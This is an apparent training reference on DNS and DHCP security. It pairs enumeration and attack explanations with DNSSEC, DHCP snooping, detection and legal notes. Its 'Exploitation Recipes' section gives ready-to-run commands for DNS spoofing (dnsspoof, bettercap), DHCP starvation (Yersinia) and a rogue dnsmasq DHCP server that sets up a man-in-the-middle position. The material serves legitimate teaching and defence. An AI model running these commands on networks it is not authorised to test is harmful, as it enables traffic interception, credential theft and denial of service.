# DNS and DHCP

## 1. Overview

DNS (Domain Name System, RFC 1035) resolves names to IP addresses and is the directory of the internet. DHCP (Dynamic Host Configuration Protocol, RFC 2131) assigns IP addresses, gateways, and DNS servers to hosts on a network. Both protocols are unauthenticated by default: DNS replies can be spoofed, and DHCP offers can be forged.

That property is the root of DNS cache poisoning, DNS spoofing, DHCP starvation, and rogue DHCP servers. This file covers the mechanics, the offensive techniques, and the defensive controls.

## 2. Reconnaissance / Enumeration

### DNS enumeration

- `dig example.com A` - query A records.
- `dig example.com ANY` - query all records (often filtered).
- `dig @10.10.10.10 example.com AXFR` - attempt a zone transfer; misconfigured servers return the full zone.
- `dnsenum example.com` - automated enumeration (A, MX, NS, TXT, zone transfer).
- `dnsrecon -d example.com -t std` - standard enumeration.
- `fierce --domain example.com` - subdomain brute force.

### DHCP enumeration

- `nmap --script broadcast-dhcp-discover` - send a DHCP DISCOVER and print the OFFER.
- `dhcpcd -T eth0` - request a lease and print the result.
- `tcpdump -i eth0 -nn port 67 or port 68` - watch DHCP traffic on the segment.

## 3. Common Attack Vectors

### DNS cache poisoning

The attacker sends forged DNS responses to a resolver, hoping to race the legitimate response and insert a malicious record into the cache. The Kaminsky attack (2008) exploited this at scale by querying random subdomains to force the resolver to make many queries.

### DNS spoofing (on-path)

An on-path attacker answers DNS queries with forged replies before the real resolver does. Tools like `dnsspoof` and `bettercap` automate this.

### DNS tunneling

DNS queries and responses can carry arbitrary data in TXT, NULL, or CNAME records. Tools like `iodine` and `dnscat2` tunnel IP over DNS, bypassing firewalls that allow DNS but block other protocols.

### DHCP starvation

The attacker sends many DHCP DISCOVER messages with different MAC addresses, exhausting the DHCP pool. Legitimate clients cannot obtain a lease.

### Rogue DHCP server

The attacker runs a DHCP server on the segment and answers DISCOVER messages before the legitimate server. Clients receive the attacker's IP, gateway, and DNS server, giving the attacker a MITM position.

## 4. Exploitation Recipes

### DNS spoofing with dnsspoof (dsniff)

```bash
# hosts.txt maps names to attacker-controlled IPs
echo "10.10.10.50 *.example.com" > hosts.txt
sudo dnsspoof -i eth0 -f hosts.txt
```

dnsspoof answers any DNS query for `*.example.com` with `10.10.10.50`, provided the attacker is on-path (via ARP spoofing).

### DNS spoofing with bettercap

```bash
sudo bettercap -iface eth0
# inside bettercap:
# set dns.spoof.domains example.com
# set dns.spoof.address 10.10.10.50
# dns.spoof on
```

bettercap is the modern replacement for dnsspoof and combines DNS spoofing with ARP spoofing and HTTP manipulation.

### DHCP starvation with Yersinia

```bash
sudo yersinia -I
# press 'g' to select DHCP, then '1' to send DHCP DISCOVER flood
```

Yersinia sends DHCP DISCOVER messages with random MAC addresses, exhausting the pool. The legitimate server runs out of leases.

### Rogue DHCP with dnsmasq

```bash
sudo dnsmasq --interface=eth0 --dhcp-range=10.10.10.100,10.10.10.200,12h --dhcp-option=3,10.10.10.50 --dhcp-option=6,10.10.10.50
```

This runs a rogue DHCP server that hands out `10.10.10.50` (the attacker) as both gateway and DNS server. Combined with a rogue DNS server, it is a full MITM position.

## 5. Post-Exploitation

After a successful DNS or DHCP attack, the attacker can:

- Redirect users to phishing pages (DNS spoofing).
- Intercept credentials via a rogue gateway (rogue DHCP + ARP spoofing).
- Exfiltrate data over DNS tunneling, bypassing egress firewalls.
- Deny service by exhausting the DHCP pool.

## 6. Preventive Controls

- **DNSSEC**: cryptographically signs DNS records; a resolver that validates DNSSEC rejects forged replies.
- **DNS over HTTPS / DNS over TLS**: encrypts DNS traffic, preventing on-path spoofing.
- **DHCP snooping** on managed switches: only trusted ports can send DHCP OFFER/ACK. Enabled with `ip dhcp snooping` and `ip dhcp snooping trust` on uplinks.
- **Port security**: limit MAC addresses per port, slowing DHCP starvation.
- **Rate-limit DHCP** on the switch: `ip dhcp snooping limit rate 10` per port.
- **RA Guard** for IPv6 (see the ICMP and Traceroute file).
- **Egress filtering**: only allow DNS to known resolvers; block DNS to arbitrary external servers.

## 7. Detection Controls

- **Zeek** `dns` analyzer logs every query and response; a sudden flood of queries for random subdomains is a Kaminsky-style attack.
- **Zeek** `dhcp` analyzer logs DISCOVER/OFFER/REQUEST/ACK; a rogue server appears as a second OFFER from a different MAC.
- **Switch DHCP snooping logs**: dropped DHCP OFFER on an untrusted port is a rogue-server signal.
- **IDS rules**: alert on DNS TXT/NULL responses much larger than the query (tunneling), on DNS responses from non-resolver IPs, on DHCP OFFER from non-trusted MACs.
- **NetFlow**: a spike in UDP 53 or UDP 67/68 from one host.

## 8. Verification

- On the resolver: `dig +dnssec example.com` should show the `ad` flag if DNSSEC validates.
- On the switch: `show ip dhcp snooping binding` lists trusted leases; `show ip dhcp snooping statistics` shows dropped packets.
- Test DHCP snooping: run a rogue DHCP server on an untrusted port; the switch should drop its OFFER.
- Test DNSSEC: query a deliberately broken domain; the resolver should return SERVFAIL.

## 9. Case Studies

- **Kaminsky DNS cache poisoning (2008)**: a race condition in DNS resolvers allowed an attacker to poison the cache at scale. The fix was source-port randomization and DNSSEC adoption.
- **DNSChanger (2011)**: malware changed victims' DNS servers to attacker-controlled ones, redirecting ad traffic. The lesson: DNS is a high-value target; monitor resolver changes.
- **DHCP starvation in hotel and conference networks (public reporting)**: rogue DHCP servers have been used to redirect guests to phishing portals.

## 10. Legal and Ethical Notes

DNS spoofing, cache poisoning, DHCP starvation, and rogue DHCP servers on a network you do not own or have explicit written authorization to test are illegal in most jurisdictions. In a penetration test, these techniques must be listed in the scope and rules of engagement. On shared infrastructure (hotels, conferences, public Wi-Fi), even passive DHCP monitoring may violate terms of service.

## 11. References

- RFC 1035 (DNS) - https://www.rfc-editor.org/rfc/rfc1035
- RFC 2131 (DHCP) - https://www.rfc-editor.org/rfc/rfc2131
- RFC 4033 (DNSSEC introduction) - https://www.rfc-editor.org/rfc/rfc4033
- dnsspoof (dsniff) - https://linux.die.net/man/8/dnsspoof
- bettercap DNS spoof module - https://www.bettercap.org/modules/ethernet/spoofers/dns.spoof/
- Yersinia - https://github.com/tomac/yersinia
- dnsmasq documentation - https://thekelleys.org.uk/dnsmasq/doc.html
- Zeek DNS analyzer - https://docs.zeek.org/en/master/scripts/base/protocols/dns/main.zeek.html
- Cisco DHCP snooping - https://www.cisco.com/c/en/us/td/docs/switches/lan/catalyst9300/software/release/17-6/configuration_guide/sec/b_176_sec_9300_cg/configuring_dhcp_snooping.html

## Certification Alignment

- CompTIA Network+ (N10-009): Objective 1.6 (DNS and DHCP), Objective 3.2 (attacks), Objective 5.3 (troubleshooting)
- Cisco CCNA (200-301): 4.1 (Layer 2 security), 5.5 (security concepts), 1.6 (troubleshooting)
